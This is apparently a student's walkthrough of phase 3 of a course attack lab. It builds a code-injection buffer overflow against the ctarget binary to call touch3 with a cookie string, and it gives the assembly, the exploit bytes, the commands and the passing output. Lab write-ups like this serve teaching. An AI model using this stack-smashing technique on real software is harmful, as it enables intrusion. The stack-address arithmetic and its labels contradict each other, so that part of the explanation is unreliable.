Phase 3 is kinda similar to phase to except that we are trying to call the function touch3 and have to pass our cookie to it as string

In the instruction it tells you that if you store the cookie in the buffer allocated for getbuf, the functions hexmatch and strncmp
may overwrite it as they will be pushing data on to the stack, so you have to be careful where you store it.

We will be storing it before the return address of getbuff (24 bytes)

The return address of getbuf is %rsp + buffer, the buffer was 24 bytes so it will be %rsp + 24

`0x18` = `24`

we know, `%rsp = 0x55623840`

Thus, return address = `0x55623840 + 0x18  = 0x55623858`

Your cookie address = `0x55623840 - 0x18` = `0x55623828`

If you look in the disassembled file, you can find the address of touch3

Mine is at `0x00401860`

Now you need this assembly code, same steps generating the byte representation

```
    movq $0x55623858,%rdi /* %rsp + 0x18 */
    pushq $0x00401860      /* touch3 address */   
    retq
```

The byte representation is as follows:
```
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 58 38 62 55 	mov    $0x55623858,%rdi
   7:	68 60 18 40 00       	pushq  $0x401860
   c:	c3                   	retq   
```

Now, grab the bytes from the above code and start constructing your exploit string. Create a new file named phase3.txt and here is what mine looks like:
```
48 c7 c7 58 38 62 55 68
60 18 40 00 c3 00 00 00 /* mov return address of getbuf to rdi register and push address of touch3 to the stack */
00 00 00 00 00 00 00 00 /* padding */
28 38 62 55 00 00 00 00 /* return address of rsp-0x18, where the string will be stored*/
34 33 34 62 34 62 37 30 /* cookie string*/
```
If you look at the last row above, the cookie is in hex format, so you need to take your cookie and convert in to string format.
Go to http://www.unit-conversion.info/texttools/hexadecimal/ and put in your cookie and it should give you the text format or you could look up ascii equivalent on your machine


Last step is to generate the raw eploit string using the hex2raw program.

`./hex2raw < phase3.txt > raw-phase3.txt`

Finally, you run the raw file

`./ctarget < raw-phase3.txt`

Response looks like below

```
Cookie: 0x434b4b70
Type string:Touch3!: You called touch3("434b4b70")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
